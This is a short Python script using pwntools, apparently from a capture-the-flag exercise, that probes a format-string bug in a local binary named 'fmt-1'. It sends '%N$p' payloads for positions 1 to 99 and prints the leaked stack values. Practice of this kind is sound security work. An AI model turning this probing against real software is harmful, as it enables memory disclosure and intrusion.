#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib

debug = not False

c = 0
pwn_file = "./fmt-1"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
for i in range(1, 100):
    c = process(pwn_file)
    print(i)
    print(flat({0:"%{}$p".format(i)}, length=0x20))
    c.sendline(flat({0:"%{}$p".format(i)}, length=0x20))
    print(c.recvline())
    c.close()

